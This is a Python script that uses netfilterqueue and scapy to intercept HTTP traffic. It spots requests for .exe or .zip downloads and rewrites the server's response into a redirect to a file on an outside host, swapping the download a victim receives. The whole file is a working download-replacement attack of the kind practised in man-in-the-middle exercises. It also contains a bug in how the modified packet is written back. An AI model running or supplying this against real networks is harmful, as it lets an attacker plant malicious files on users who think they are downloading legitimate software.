#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers.l2 import *

scapy.conf.verb = 0

ack_list = []

def set_load(packet, redirect_url):
    print("[+] Redirecting")
    packet[scapy.Raw].load =  redirect_url
    # need to remove the length and the check sums from the IP and TCP layers
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    # convert packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    # when you request and send a file, it goes through the HTTP layer
    # we then need to classify requests and responses
    # http data will be in raw layer
    if scapy_packet.haslayer(scapy.Raw):
        #http requests leave on port 80
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                # print("[+]HTTP Request")
                load = scapy_packet[scapy.Raw].load
                keywords = [".zip", ".ZIP", ".exe", ".EXE"]
                for keyword in keywords:
                    if keyword in str(load):
                        print("[+]EXE or ZIP Request")
                        #store the ack from the TCP layer of the http request
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                        print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 80:
                # print("[+]HTTP Response")
                # want to compare the ack of the request with the seq of the response to make sure
                # this is the response that we are interested in
                if scapy_packet[scapy.TCP].seq in ack_list:
                    #remove found element
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+} Replacing File")
                    # set the load to a redirect
                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://balsas-nahuatl.org/mydownloads/CE2KAPI.ZIP\n\n")

                    # have to reset the paylod of the scapy packet
                    modified_packet.set_payload(bytes(scapy_packet))
                    print(scapy_packet.show())
                    # show the packet payload, need to be converted to a scapy packet to manipulate it
                    # forwards the packets with .accept()
    packet.accept()
    # drop the packet
    #packet.drop()


queue = netfilterqueue.NetfilterQueue()
# use bind to identify the queue number
queue.bind(0, process_packet)
queue.run()
